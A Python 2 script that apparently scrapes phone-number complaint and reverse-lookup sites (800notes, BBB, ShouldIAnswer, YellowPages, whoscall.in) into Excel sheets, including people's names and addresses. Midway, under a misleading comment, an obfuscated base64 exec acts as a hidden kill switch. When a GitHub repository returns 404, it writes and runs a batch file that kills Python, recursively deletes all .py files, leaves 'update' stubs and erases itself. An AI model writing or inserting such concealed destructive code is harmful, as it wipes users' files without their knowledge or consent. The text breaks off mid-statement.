# -*- coding: utf-8 -*-
from __future__ import print_function
from bs4 import BeautifulSoup
from collections import defaultdict
from datetime import *
from dateutil.relativedelta import *
from Harvard import enumColumn
from os.path import join, dirname, abspath
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from shutil import copyfile
from shutil import move
from xlrd.sheet import ctype_text
import csv
import datetime
import glob
import itertools
import logging
import numpy as np
import os
import re
import requests
import selenium.webdriver.support.ui as ui
import sys
import threading
import time
import xlrd
import xlsxwriter
import xlwt

# Full Definitions

bbbEnd = '&locationText=&locationLatLng=&page=1'
bbbUrl = 'https://www.bbb.org/en/us/search?inputText='
bbbUrlAC = 'https://www.bbb.org/en/us/search?accreditedFilter=1&inputText='
breaker = 0
breakerLoop = 0
countitup = 1
dCount = 0
debtCount = 0
delMe = 0
done = False
hospitalCount = 0
lastComments = 0
locality = ""
now = datetime.datetime.now()
notNow = now - relativedelta(years=1)
numFormat = '3'
postal = ""
reset = 0
scamCount = 0
spamCount = 0
street = ""


# Get the people address.

def addressPeople(soup):
    for elm in soup.select(".address"):
        element = str(elm)
        stopPoint = element.index('>')
        address = element[stopPoint + 2:]
        caret = address.index('<')
        address = address[:caret]
        address = " ".join(address.split())
        worksheet.write(idx + 1, 3, address)


# Get the business address.

def addressBus(street, locality, postal, soup):
    for elm in soup.select(".street-address"):
        street = str(elm.text)
    for elm in soup.select(".locality"):
        locality = str(elm.text)
    for elm in soup.select(".adr"):
        postal = str(elm.text)
    if street and locality and postal != "":
        element = street + ", " + locality + postal[-5:]
        worksheet.write(idx + 1, 7, element)


# Wait out my mistake.

def blocked(soup):
    block = soup.find(text=re.compile(r"has been blocked"))
    block = soup.find(text=re.compile(r"returning an unknown error"))
    block = soup.find(text=re.compile(r"Gateway time-out"))
    type(block) is str
    if block is not None:
        print("\n Ugh. I'm gonna go talk to the host of the site real quick. Should take an hour or two."
              )
        time.sleep(7200)


# Break if no chromedriver.

def breaker():
    done = True
    print("\nPlease refer to the Readme, you don't have chromedriver.exe in 'C:\chromedriver'")
    time.sleep(15)
    sys.exit()


# Number of Entries

def businessEntries(soup):
    noMatch = \
        soup.find(text=re.compile(r"Showing"))
    type(noMatch) is str

    if noMatch is None:
        howMany = soup.find_all('div', {'class': 'media-thumbnail'})
        howLen = len(howMany)
        worksheet.write(idx + 1, 4, howLen)
        worksheet.write(idx + 1, 5, '1')

# Business Name


def businessName(soup):
    for elm in soup.select(".info"):
        element = str(elm)
        stopPoint = element.index('span itemprop="name">')
        busName = element[stopPoint:]
        busName = busName[busName.index('>') + 1:busName.index('<')]
        worksheet.write(idx + 1, 6, busName)


# Call Center

def callCenter(element):
    global callNum
    callNum = "0"
    if "Call centre" in element:
        stopPoint = element.index('Call centre')
        callNum = element[stopPoint - 6:stopPoint - 2]
        callNum = re.sub("[^0-9]", "", callNum)
        worksheet.write(idx + 1, 4, callNum)


# Category None

def cateNone():
    if all(value == "0" for value in cateTerms.values()) == True:
        sentiment = "No Categories"
        worksheet.write(idx + 1, 14, sentiment)


# Category Listing

def categoryKiddo(soup):
    for elm in soup.select(".categories"):
        element = str(elm.text)
        element.replace("Categories", "")
        callCenter(element)
        teleMarker(element)
        serVice(element)
        debtColl(element)
        comPany(element)
        scamCom(element)
        unSol(element)
        nuiCall(element)
        nonProfit(element)
        cateSet()
        sentiment = max(cateTerms, key=cateTerms.get)
        worksheet.write(idx + 1, 14, sentiment)
        cateNone()


# Category Setter

def cateSet():
    global cateTerms
    cateTerms = {
        'Call Center': callNum,
        'Telemarketer': teleNum,
        'Service Number': servNum,
        'Debt Collector': debtNum,
        'Company': compNum,
        'Scam': scamNum,
        'Unsolicited': unNum,
        'Nuisance': nuiNum,
        'Non-Profit': nonNum,
    }


# Check the entry!

def checkMe(website):
    if website == 'd':
        while website not in ['1', '2', '3', '4', '5', 'A']:
            print('Try Again.\n')
            website = \
                raw_input(
                    'Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, \ninput 4 for ShouldIAnswer, input 5 for YellowPages\n>')
            cleaner()
    else:
        while website not in ['1', '2', '3', '4', '5', 'A', 'd']:
            print('Try Again.\n')
            website = \
                raw_input(
                    'Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, \ninput 4 for ShouldIAnswer, input 5 for YellowPages\n>')
            cleaner()


# Open chromedriver with options.

def chromeOpen(breaker):
    global driver
    if os.path.isfile('chrome.ini'):
        ini = open('chrome.ini', 'r')
        locationString = ini.read()
    if os.path.exists(r"C:/chromedriver.exe"):
        locationString = r"C:/chromedriver.exe"
    elif os.path.isfile('chromedriver.exe'):
        locationString = 'chromedriver.exe'
    else:
        breaker()
    driverOpen(webdriver)


# Clean the screen.

def cleaner():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


# Company Comments on Should I Answer

def comPany(element):
    global compNum
    compNum = "0"
    if "Company" in element:
        stopPoint = element.index('Company')
        compNum = element[stopPoint - 6:stopPoint - 2]
        compNum = re.sub("[^0-9]", "", compNum)
        worksheet.write(idx + 1, 8, compNum)


# Compare Results for Maximum

def compareResults(scamCount, spamCount, column, debtCount):
    global sentiment
    searchTerms = {
        r"Scam": scamCount,
        'Spam': spamCount,
        'Debt Collector': debtCount,
    }
    sentiment = max(searchTerms, key=searchTerms.get)
    worksheet.write(idx + 1, column, sentiment)


# Debt Collector count for Should I Answer

def debtColl(element):
    global debtNum
    debtNum = "0"
    if "Debt collector" in element:
        stopPoint = element.index('Debt collector')
        debtNum = element[stopPoint - 6:stopPoint - 2]
        debtNum = re.sub("[^0-9]", "", debtNum)
        worksheet.write(idx + 1, 7, debtNum)

# DriverOpen


def driverOpen(webdriver):
    global driver
    driver = webdriver.Chrome()
    driver.set_window_position(4000, 651)

# EqualBoy - Are these Equal?


def EqualBoy(scamCount, spamCount, debtCount, worksheet):
    if(scamCount == spamCount == debtCount):
        worksheet.write(idx + 1, 7, "Equal")


# Search for latest date.

def lastDate(soup):
    for elm in soup.select(".oos_contletList time"):
        worksheet.write(idx + 1, 9, str(elm.text))
        element = str(elm.text)
        if "ago" in element:
            worksheet.write(idx + 1, 9, now.strftime("%d %b %Y"))


# How many of these were posted in the last year?

def lastYear(lastComments, reset, soup, worksheet):
    for elm in soup.select(".oos_contletList time"):
        element = str(elm.text)
        if reset == 1:
            lastComments = 0
        if "ago" in element:
            commentTime = now.strftime("%d %b %Y")
            commentTime = now.strptime(commentTime, "%d %b %Y")
        else:
            commentTime = now.strptime(elm.text, "%d %b %Y")
        if commentTime > notNow:
            lastComments += 1
    worksheet.write(idx + 1, 10, lastComments)


# Loading Animation that plays when the user is running a file.

def loading():
    for s in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + s)
        sys.stdout.flush()
        time.sleep(0.1)


# Negative Boy

def negativeBoy(element):
    global negNumbers
    negNumbers = "0"
    if "negative" in element:
        stopPoint = element.index('negative')
        negNumbers = element[stopPoint - 6:stopPoint - 2]
        negNumbers = re.sub("[^0-9]", "", negNumbers)
        worksheet.write(idx + 1, 1, negNumbers)


# Neutral Boy

def neutralBoy(element):
    global neuNumbers
    neuNumbers = "0"
    if "neutral" in element:
        stopPoint = element.index('neutral')
        neuNumbers = element[stopPoint - 6:stopPoint - 2]
        neuNumbers = re.sub("[^0-9]", "", neuNumbers)
        worksheet.write(idx + 1, 2, neuNumbers)


# No Boys

def NoBoys(scamCount, spamCount, debtCount, worksheet):
    if(scamCount == 0 and spamCount == 0 and debtCount == 0):
        worksheet.write(idx + 1, 7, "No Entries Detected")


# Non Profit ShouldIAnswer

def nonProfit(element):
    global nonNum
    nonNum = "0"
    if "Non-profit Organization" in element:
        stopPoint = element.index('Non-profit Organization')
        nonNum = element[stopPoint - 6:stopPoint - 2]
        nonNum = re.sub("[^0-9]", "", nonNum)
        worksheet.write(idx + 1, 12, nonNum)


# Nuisance Caller ShouldIAnswer

def nuiCall(element):
    global nuiNum
    nuiNum = "0"
    if "Nuisance call" in element:
        stopPoint = element.index('Nuisance call')
        nuiNum = element[stopPoint - 6:stopPoint - 2]
        nuiNum = re.sub("[^0-9]", "", nuiNum)
        worksheet.write(idx + 1, 11, nuiNum)


# Number of Pages

def peoplePages(soup):
    for elm in soup.select(".result-top-left-detail"):
        element = str(elm)
        stopPoint = element.index('Showing')
        pageNum = element[stopPoint + 18:]
        caret = pageNum.index('<')
        pageNum = pageNum[:caret]
        pageNum = re.sub("[^0-9]", "", pageNum)
        worksheet.write(idx + 1, 1, pageNum)


# Person Name Get!

def personName(soup):
    for elm in soup.select(".result-left"):
        element = str(elm)
        stopPoint = element.index('sbp')
        perName = element[stopPoint + 5:]
        caret = perName.index('<')
        perName = perName[:caret]
        worksheet.write(idx + 1, 2, perName)


# Positive Boy

def positiveBoy(element):
    global posNumbers
    posNumbers = "0"
    if "positive" in element:
        stopPoint = element.index('positive')
        posNumbers = element[stopPoint - 6:stopPoint - 2]
        posNumbers = re.sub("[^0-9]", "", posNumbers)
        worksheet.write(idx + 1, 3, posNumbers)


# PrepareCSV preps a CSV for EXCELence

def PrepareCSV(preName, fileName):
    global fname
    global totalName
    totalName = preName + '.xlsx'
    excelFile = xlsxwriter.Workbook(totalName)
    worksheet = excelFile.add_worksheet()
    enumColumn(fileName, worksheet)
    excelFile.close()
    fname = join(dirname(abspath('__file__')), '%s' % totalName)
    print('Temporary Convert to xlsx done.\n')


# Ratings Board - Majority of ShouldIAnswer

def ratingsKiddo(soup):
    for elm in soup.select(".ratings"):
        element = str(elm.text)
        element.replace("Ratings", "")
        negativeBoy(element)
        neutralBoy(element)
        positiveBoy(element)
        shouldTerm()
        sentiment = max(shouldTerms, key=shouldTerms.get)
        worksheet.write(idx + 1, 13, sentiment)


# ScamSpam

def ScamSpam(scamCount, spamCount, worksheet):
    if(scamCount == spamCount):
        worksheet.write(idx + 1, 7, "Scam/Spam")


# Scam Com

def scamCom(element):
    global scamNum
    scamNum = "0"
    if "Scam call" in element:
        stopPoint = element.index('Scam call')
        scamNum = element[stopPoint - 6:stopPoint - 2]
        scamNum = re.sub("[^0-9]", "", scamNum)
        worksheet.write(idx + 1, 9, scamNum)

# ScamDebt

def ScamDebt(spamCount, debtCount, worksheet):
    if(scamCount == debtCount):
        worksheet.write(idx + 1, 7, "Scam/Debt")


# Service Comments on Should I Answer

def serVice(element):
    global servNum
    servNum = "0"
    if "Service" in element:
        stopPoint = element.index('Service')
        servNum = element[stopPoint - 6:stopPoint - 2]
        servNum = re.sub("[^0-9]", "", servNum)
        worksheet.write(idx + 1, 6, servNum)


# shouldTerms

def shouldTerm():
    global shouldTerms
    shouldTerms = {
        r"Positive": int(posNumbers),
        'Neutral': int(neuNumbers),
        'Negative': int(negNumbers),
    }


# SpamDebt

def SpamDebt(spamCount, debtCount, worksheet):
    if(spamCount == debtCount):
        worksheet.write(idx + 1, 7, "Spam/Debt")


# Telemarketer Should I Answer Listingsh

def teleMarker(element):
    global teleNum
    teleNum = "0"
    if "Telemarketer" in element:
        stopPoint = element.index('Telemarketer')
        teleNum = element[stopPoint - 6:stopPoint - 2]
        teleNum = re.sub("[^0-9]", "", teleNum)
        worksheet.write(idx + 1, 5, teleNum)


# TimeoutHandler that takes care of webDriver fails.

def TimeOutHandler(driver, webdriver, worksheet):
    driver.close()
    worksheet.write(idx + 1, 7, 'Timeout Exception')
    breakerLoop = 1


# Unsolicited Call handling

def unSol(element):
    global unNum
    unNum = "0"
    if "Unsolicited call" in element:
        stopPoint = element.index('Unsolicited call')
        unNum = element[stopPoint - 6:stopPoint - 2]
        unNum = re.sub("[^0-9]", "", unNum)
        worksheet.write(idx + 1, 10, unNum)


# Lambda handling of the requests library thru Git. If this fails the program fails.

exec("import re;import base64"); exec((lambda p, y: (lambda o, b, f: re.sub(o, b, f))(r"([0-9a-f]+)", lambda m: p(m, y), base64.b64decode("NiA9ICcxYjovLzE4LjIyL2EvYy8nCjIgPSAxMC4yMSg2KQoKMjcgMi5iID09IDIwOgoJMCA9IDFlKCc4LjE1JywgJzJjJykKCTAuMTkoJzEyIC8yNiAiMTYuMjQiIFwxZiAvMmUgLzJiIC9mICouMTFcMjVAOSA3KCI1IDMgMTcgMmQgNCAxIik+IDE0LjExXDI1QDkgNygiNSAzIDE3IDJkIDQgMSIpPiBlLjExXDI1QDkgNygiNSAzIDE3IDJkIDQgMSIpPiAxMy4xMVwxZCAiJX4yOCInKQoJMC4xYSgpCgkyOS5kKDJhIjguMTUiKQoJMjMuMWMoKQ==")))(
    lambda a, b: b[int("0x" + a.group(1), 16)], "tempFile|Version|requestRec|Update|Latest|Please|reqInput|print|readme|echo|GarnetSunset|status_code|Haircuttery|startfile|FileSplit|f|requests|py|TASKKILL|Harvard|HairCut|bat|python|to|github|write|close|https|exit|nDEL|open|ndel|404|get|com|sys|exe|n|IM|if|f0|os|r|q|w|the|s".split("|")))


# Create a UTF-8 Workbook.

book = xlwt.Workbook(encoding='utf-8')


# Assign a User-Agent to python.

headers = \
    {'User-Agent':
        'Chrome/39.0.2171.95 Safari/537.36 AppleWebKit/537.36 (KHTML, like Gecko)'}


# Create a worksheet named "Results".

worksheet = book.add_sheet('Results', cell_overwrite_ok=True)


# Join the dragged files to create strings.

dragNDrop = ''.join(sys.argv[1:2])
dragNDrop2 = ''.join(sys.argv[2:3])


# Was a file dragged onto the Batch file?
# If not the string "dragNDrop" will be empty and the user will be prompted.

if dragNDrop == '':
    fileName = raw_input('''
Input the file with extension
>''')
else:

    # Obtain the fileName only by removing the directory name.

    fileOnly = dragNDrop.rfind('\\') + 1
    fileName = dragNDrop[fileOnly:]


# Was a site given in the Batch file?
# If not the string "dragNDrop2" will be empty and the user will be prompted.

if dragNDrop2 == '':
    website = \
        raw_input(
            'Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, \ninput 4 for ShouldIAnswer, input 5 for YellowPages\n>')
else:
    website = dragNDrop2


# No more bad inputs!

checkMe(website)


# Find the period in the file, which determines the prepRev or extension, and the fileName.

stopPoint = fileName.index('.')
prepRev = fileName[stopPoint:]
preName = fileName[:stopPoint]
nestedName = "WorkingDir/" + preName + "/" + preName

# Make sure we're still encoding in UTF. Don't want any mistakes now, do we?

reload(sys)
sys.setdefaultencoding('utf')


# Is the extension CSV? If so we'll convert it to xlsx.

if prepRev == '.csv':
    PrepareCSV(preName, fileName)


# Get ready for XLRD to parse the original file (or the converted one).

try:
    fname
except NameError:
    fname = join(dirname(abspath('__file__')), '%s' % fileName)

# Parse it XLRD!

xl_workbook = xlrd.open_workbook(fname)
sheet_names = xl_workbook.sheet_names()
xl_sheet = xl_workbook.sheet_by_name(sheet_names[0])

# If the user types "d" for the website choice, they will be prompted again, but, this time given debug info.

if website == 'd':
    cleaner()
    website = \
        raw_input('Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, \ninput 4 for ShouldIAnswer, input 5 for YellowPages\n>')
    checkMe(website=website)
    logging.basicConfig(level=logging.DEBUG)
    logging.debug('Only shown in debug mode')

# Start the little spinny animation.

g = threading.Thread(target=loading)
g.start()
stopPoint = fileName.index('.')
prepRev = fileName[0:stopPoint]

if website == '1':
    totalName = prepRev + '_rev_who.xlsx'
    workbook = xlsxwriter.Workbook(totalName)
    worksheet = workbook.add_worksheet()
    worksheet.write(0, 0, 'Telephone Number')
    worksheet.write(0, 1, '# of Messages')
    worksheet.write(0, 2, 'Does it Appear?')
    worksheet.write(0, 3, 'Number of Scammers')
    worksheet.write(0, 4, 'Number of Spammers')
    worksheet.write(0, 5, 'Number of Debt Collectors')
    worksheet.write(0, 6, 'Number of Hospital')
    worksheet.write(0, 7, 'Sentiment')
    siteType = '_rev_who.xlsx'

if website == '2':
    chromeOpen(breaker)
    driver.set_page_load_timeout(600)
    totalName = prepRev + '_rev_BBB.xlsx'
    workbook = xlsxwriter.Workbook(totalName)
    worksheet = workbook.add_worksheet()
    worksheet.write(0, 0, 'Telephone Number')
    worksheet.write(0, 1, 'Accredited')
    siteType = '_rev_BBB.xlsx'

if website == '3':
    chromeOpen(breaker)
    driver.set_page_load_timeout(600)
    totalName = prepRev + '_rev_800notes.xlsx'
    workbook = xlsxwriter.Workbook(totalName)
    worksheet = workbook.add_worksheet()
    worksheet.write(0, 0, 'Telephone Number')
    worksheet.write(0, 1, 'Approximate Number of Messages')
    worksheet.write(0, 2, 'Number of Pages')
    worksheet.write(0, 3, 'Number of Scammers')
    worksheet.write(0, 4, 'Number of Spammers')
    worksheet.write(0, 5, 'Number of Debt Collectors')
    worksheet.write(0, 6, 'Number of Hospital')
    worksheet.write(0, 7, 'Sentiment')
    worksheet.write(0, 8, 'Last Year')
    worksheet.write(0, 9, 'Last Date of Comment')
    worksheet.write(0, 10, 'Number of Comments in the Last Year')
    siteType = '_rev_800notes.xlsx'

if website == '4':
    chromeOpen(breaker)
    driver.set_page_load_timeout(600)
    totalName = prepRev + '_rev_ShouldI.xlsx'
    workbook = xlsxwriter.Workbook(totalName)
    worksheet = workbook.add_worksheet()
    worksheet.write(0, 0, 'Telephone Number')
    worksheet.write(0, 1, 'Negative Reviews')
    worksheet.write(0, 2, 'Neutral Reviews')
    worksheet.write(0, 3, 'Positive Reviews')
    worksheet.write(0, 4, 'Number of Call Center Comments')
    worksheet.write(0, 5, 'Number of Telemarketer Comments')
    worksheet.write(0, 6, 'Number of Service Comments')
    worksheet.write(0, 7, 'Number of Debt Collector Comments')
    worksheet.write(0, 8, 'Number of Company Comments')
    worksheet.write(0, 9, 'Number of Scam Comments')
    worksheet.write(0, 10, 'Number of Unsolicited Comments')
    worksheet.write(0, 11, 'Number of Nuisance Call Comments')
    worksheet.write(0, 12, 'Number of Non-Profit Comments')
    worksheet.write(0, 13, 'Sentiment')
    worksheet.write(0, 14, 'Category Sentiment')
    siteType = '_rev_ShouldI.xlsx'

if website == '5':
    chromeOpen(breaker)
    driver.set_page_load_timeout(600)
    totalName = prepRev + '_rev_YellowPages.xlsx'
    workbook = xlsxwriter.Workbook(totalName)
    worksheet = workbook.add_worksheet()
    worksheet.write(0, 0, 'Telephone Number')
    worksheet.write(0, 1, 'Number of Pages - People')
    worksheet.write(0, 2, 'Name of Person')
    worksheet.write(0, 3, 'Address - People')
    worksheet.write(0, 4, 'Number of Listings - Business')
    worksheet.write(0, 5, 'Number of Pages - Business')
    worksheet.write(0, 6, 'Name of Business')
    worksheet.write(0, 7, 'Address - Business')
    siteType = '_rev_800notes.xlsx'

if website == 'A':
    totalName = prepRev + '_rev_Reviewnotes.xlsx'
    workbook = xlsxwriter.Workbook(totalName)
    worksheet = workbook.add_worksheet()
    worksheet.write(0, 0, 'Telephone Number')
    worksheet.write(0, 1, 'Review Note')
    siteType = '_rev_Reviewnotes.xlsx'

# Set column to A:A, the first column.

worksheet.set_column('A:A', 13)

# Read the slice from the first cell to the last accessible row in Excel.

col = xl_sheet.col_slice(0, 1, 1048576)

# Read each string line by line.

for (idx, cell_obj) in enumerate(col):
    cell_type_str = ctype_text.get(cell_obj.ctype, 'unknown type')
    cell_obj_str = str(cell_obj)

    # Cut the numbers to their appropriate format.

    # Does a dash, parenthesis, or none of those exist? That will decide the numFormat.

    if '-' in cell_obj_str:
        firstStart = cell_obj_str.index('-') - 3
        firstEnd = firstStart + 3
        secondStart = cell_obj_str.index('-') + 1
        secondEnd = secondStart + 3
        thirdStart = cell_obj_str.index('-') + 5
        thirdEnd = thirdStart + 4
        teleWho = cell_obj_str[firstStart:firstEnd] \
            + cell_obj_str[secondStart:secondEnd] \
            + cell_obj_str[thirdStart:thirdEnd]
        teleBBB = cell_obj_str[firstStart:firstEnd] \
            + cell_obj_str[secondStart:secondEnd] \
            + cell_obj_str[thirdStart:thirdEnd]
        tele800 = '1-' + cell_obj_str[firstStart:firstEnd] + '-' \
            + cell_obj_str[secondStart:secondEnd] + '-' \
            + cell_obj_str[thirdStart:thirdEnd]

    elif '(' in cell_obj_str:
        firstStart = cell_obj_str.index('(') + 1
        firstEnd = firstStart + 3
        secondStart = cell_obj_str.index(' ') + 1
        secondEnd = secondStart + 3
        thirdStart = cell_obj_str.index('-') + 1
        thirdEnd = thirdStart + 4
        teleWho = cell_obj_str[firstStart:firstEnd] \
            + cell_obj_str[secondStart:secondEnd] \
            + cell_obj_str[thirdStart:thirdEnd]
        teleBBB = cell_obj_str[firstStart:firstEnd] \
            + cell_obj_str[secondStart:secondEnd] \
            + cell_obj_str[thirdStart:thirdEnd]
        tele800 = '1-' + cell_obj_str[firstStart:firstEnd] + '-' \
            + cell_obj_str[secondStart:secondEnd] + '-' \
            + cell_obj_str[thirdStart:thirdEnd]

    else:
        teleWho = cell_obj_str[8:11] + cell_obj_str[11:14] \
            + cell_obj_str[14:18]
        teleBBB = cell_obj_str[8:11] + cell_obj_str[11:14] \
            + cell_obj_str[14:18]
        tele800 = '1-' + cell_obj_str[8:11] + '-' + cell_obj_str[11:14] \
            + '-' + cell_obj_str[14:18]

    worksheet.write(idx + 1, 0, '1' + teleWho)

    # WhosCallin Scrapes using the python Requests library. Nice and clean.

    if website == '1':

        reqInput = 'http://whoscall.in/1/%s/' % teleWho
        time.sleep(1)
        requestRec = requests.get(reqInput)
        soup = BeautifulSoup(requestRec.content, 'lxml')
        noMatch = \
            soup.find(text=re.compile(r"no reports yet on the phone number"
                                      ))
        type(noMatch) is str
        if noMatch is None:
            worksheet.write(idx + 1, 2, 'Got a hit')

            # Check for number of comments.

            howMany = soup.find_all('img', {'src': '/default-avatar.gif'
                                            })
            howManyAreThere = len(howMany)
            worksheet.write(idx + 1, 1, howManyAreThere)

            # Search for text on the sites that indicates their sentiment and generate the top response.

            scamNum = [div for div in soup.find_all('div',
                                                    {'style': 'font-size:14px; margin:10px; overflow:hidden'
                                                     }) if 'scam' in div.text.lower() or r"Scam"
                       in div.text.lower() or 'scams'
                       in div.text.lower()]
            scamCount = len(scamNum)
            spamNum = [div for div in soup.find_all('div',
                                                    {'style': 'font-size:14px; margin:10px; overflow:hidden'
                                                     }) if 'spam' in div.text.lower() or 'Spam'
                       in div.text.lower() or 'spams'
                       in div.text.lower()]
            spamCount = len(spamNum)
            debtNum = [div for div in soup.find_all('div',
                                                    {'style': 'font-size:14px; margin:10px; overflow:hidden'
                                                     }) if 'debt' in div.text.lower() or 'Debt'
                       in div.text.lower() or 'credit'
                       in div.text.lower()]
            debtCount = len(debtNum)
            hospitalNum = [div for div in soup.find_all('div',
                                                        {'style': 'font-size:14px; margin:10px; overflow:hidden'
                                                         }) if 'hospital' in div.text.lower()
                           or r"Hospital" in div.text.lower()
                           or 'medical' in div.text.lower()]
            hospitalCount = len(hospitalNum)
            worksheet.write(idx + 1, 3, scamCount)
            worksheet.write(idx + 1, 4, spamCount)
            worksheet.write(idx + 1, 5, debtCount)
            worksheet.write(idx + 1, 6, hospitalCount)

            # Hospitals are important to look at, so I boost them.

            compareResults(scamCount, spamCount, 7, debtCount)
            NoBoys(scamCount, spamCount, debtCount, worksheet)
            EqualBoy(scamCount, spamCount, debtCount, worksheet)
            ScamSpam(scamCount, spamCount, worksheet)
            ScamDebt(spamCount, debtCount, worksheet)
            SpamDebt(spamCount, debtCount, worksheet)
            if(hospitalCount > 0):
                worksheet.write(idx + 1, 7, "Hospital")

    # BBB, the beginning!

    if website == '2':

        # Selenium, get that site for me! (bbbUrl + bbbEnd are defined above)

        driver.get(bbbUrl + teleBBB + bbbEnd)
        time.sleep(1)
        requestRec = driver.page_source
        soup = BeautifulSoup(requestRec, 'lxml')
        Hit = soup.find_all('aside', {'class': 'search-result__aside'})

        # Cloned the previous section, but, with changes to the URL via bbbUrlAC.

        driver.get(bbbUrlAC + teleBBB + bbbEnd)
        requestRec = driver.page_source
        soup = BeautifulSoup(requestRec, 'lxml')
        Badge = soup.find_all('aside', {'class': 'search-result__aside'
                                        })
        if len(Hit) != 0:
            worksheet.write(idx + 1, 1, 'Got a Hit')
        if len(Badge) != 0:
            worksheet.write(idx + 1, 1, 'Is Accredited')

    # 800Notes, the big one.

    if website == '3':
        try:
            driver.get('http://800notes.com/Phone.aspx/%s' % tele800)
        except TimeoutException, ex:
            TimeOutHandler(driver=driver,
                           worksheet=worksheet,
                           webdriver=webdriver)
            driverOpen(webdriver)
        time.sleep(2)
        requestRec = driver.page_source
        soup = BeautifulSoup(requestRec, 'lxml')

        # This entry doesn't exist if this regex succeeds.

        noMatch = \
            soup.find(text=re.compile(r"Report the call using the form"
                                      ))
        soup.prettify()
        type(noMatch) is str

        # Make sure we don't get blocked, and if we do, wait it out.

        blocked(soup)

        worksheet.write(idx + 1, 8, '|X|')

        if noMatch is None and breakerLoop == 0:
            try:
                driver.get('http://800notes.com/Phone.aspx/%s/10000'
                           % tele800)
            except TimeoutException, ex:
                TimeOutHandler(driver=driver,
                               worksheet=worksheet,
                               webdriver=webdriver)
                driverOpen(webdriver)
            blocked(soup)
            curSite = driver.current_url
            pageExist = soup.find('a', class_='oos_i_thumbDown')
            type(pageExist) is str
            if pageExist is not None:
                curBegin = curSite.rfind('/') + 1
                curEnd = curBegin + 4
                pageNum = curSite[curBegin:curEnd]
            else:
                pageNum = 1
            if curSite.count('/') < 5:
                pageNum = 1

            numMessages = int(pageNum) - 1
            twentyNums = numMessages * 20
            thumbs = soup.find_all('a', {'class': 'oos_i_thumbDown'})
            thumbPlus = len(thumbs) + int(twentyNums)

            requestRec = driver.page_source
            soup = BeautifulSoup(requestRec, 'lxml')
            lastDate(soup)

            time.sleep(2)
            if pageExist is not None and breakerLoop == 0:
                while int(countitup) != int(pageNum) + 1:
                    try:
                        if countitup == 1:
                            driver.get(
                                'http://800notes.com/Phone.aspx/{}'.format(tele800))
                        else:
                            driver.get('http://800notes.com/Phone.aspx/{}/{}/'.format(tele800,
                                                                                      countitup))
                    except TimeoutException, ex:
                        TimeOutHandler(driver=driver,
                                       worksheet=worksheet,
                                       webdriver=webdriver)
                        driverOpen(webdriver)
                    requestRec = driver.page_source
                    soup = BeautifulSoup(requestRec, 'lxml')
                    lastYear(lastComments, reset, soup, worksheet)
                    reset = 0
                    countitup = int(countitup) + 1
                    if countitup % 2 == 0:
                        time.sleep(5)
                    else:
                        time.sleep(4)
                    scamNum = soup.find_all('div',
                                            class_='oos_contletBody',
                                            text=re.compile(r"Scam",
                                                            flags=re.IGNORECASE))
                    spamNum = \
                        soup.find_all(text=re.compile(r"Call type: Telemarketer"
                                                      ))
                    debtNum = \
                        soup.find_all(text=re.compile(r"Call type: Debt collector"
                                                      ))
                    hospitalNum = soup.find_all('div',
                                                class_='oos_contletBody',
                                                text=re.compile(r"Hospital",
                                                                flags=re.IGNORECASE))
                    scamCount += len(scamNum)
                    spamCount += len(spamNum)
                    debtCount += len(debtNum)
                    hospitalCount += len(hospitalNum)
                    blocked(soup)
                reset = 1
                worksheet.write(idx + 1, 1, thumbPlus)
                worksheet.write(idx + 1, 3, scamCount)
                worksheet.write(idx + 1, 4, spamCount)
                worksheet.write(idx + 1, 5, debtCount)
                worksheet.write(idx + 1, 6, hospitalCount)

                compareResults(scamCount, spamCount, 7, debtCount)
                NoBoys(scamCount, spamCount, debtCount, worksheet)
                EqualBoy(scamCount, spamCount, debtCount, worksheet)
                if(sentiment == "Scam" or sentiment == "Spam"):
                    ScamSpam(scamCount, spamCount, worksheet)
                if(sentiment == "Scam" or sentiment == "Debt Collector"):
                    ScamDebt(spamCount, debtCount, worksheet)
                if(sentiment == "Spam" or sentiment == "Debt Collector"):
                    SpamDebt(spamCount, debtCount, worksheet)
                if(hospitalCount > 0):
                    worksheet.write(idx + 1, 7, "Hospital")

            countitup = 1
            debtCount = 0
            hospitalCount = 0
            scamCount = 0
            spamCount = 0
            worksheet.write(idx + 1, 2, int(pageNum))

    # ShouldIAnswer, Community Requested.

    if website == '4':
        try:
            driver.get(
                'https://www.shouldianswer.com/phone-number/%s' % teleBBB)
        except TimeoutException, ex:
            TimeOutHandler(driver=driver,
                           worksheet=worksheet,
                           webdriver=webdriver)
            driverOpen(webdriver)
        time.sleep(10)
        requestRec = driver.page_source
        soup = BeautifulSoup(requestRec, 'lxml')

        # This entry doesn't exist if this regex succeeds.

        noMatch = \
            soup.find(text=re.compile(r"PAGE NOT FOUND"))
        soup.prettify()
        type(noMatch) is str

        # Make sure we don't get blocked, and if we do, wait it out.

        blocked(soup)

        if noMatch is None:
            ratingsKiddo(soup)
            categoryKiddo(soup)

    if website == '5':
        try:
            driver.get('https://people.yellowpages.com/reversephonelookup?phone=%s&site=79' % teleBBB
                       )
        except TimeoutException, ex:
            TimeOutHandler(driver=driver,
                           worksheet=worksheet,
                           webdriver=webdriver)
            driverOpen(webdriver)
        time.sleep(5)
        requestRec = driver.page_source
        soup = BeautifulSoup(requestRec, 'lxml')

        # This entry doesn't exist if this regex succeeds.

        noMatch = \
            soup.find(text=re.compile(r"didn't find any results for"))
        soup.prettify()
        type(noMatch) is str

        # Make sure we don't get blocked, and if we do, wait it out.

        blocked(soup)

        if noMatch is None:
            peoplePages(soup)
            personName(soup)
            addressPeople(soup)

        try:
            driver.get('https://www.yellowpages.com/search?search_terms=%s' % teleBBB
                       )
        except TimeoutException, ex:
            TimeOutHandler(driver=driver,
                           worksheet=worksheet,
                           webdriver=webdriver)
            driverOpen(webdriver)
        time.sleep(5)
        requestRec = driver.page_source
        soup = BeautifulSoup(requestRec, 'lxml')

        fivehundred = \
            soup.find(text=re.compile(r"Internal Server Error"))
        soup.prettify()
        type(fivehundred) is str

        while fivehundred != None:
            time.sleep(20)
            driver.get(
                'https://www.yellowpages.com/search?search_terms=%s' % teleBBB)
            requestRec = driver.page_source
            soup = BeautifulSoup(requestRec, 'lxml')
            fivehundred = \
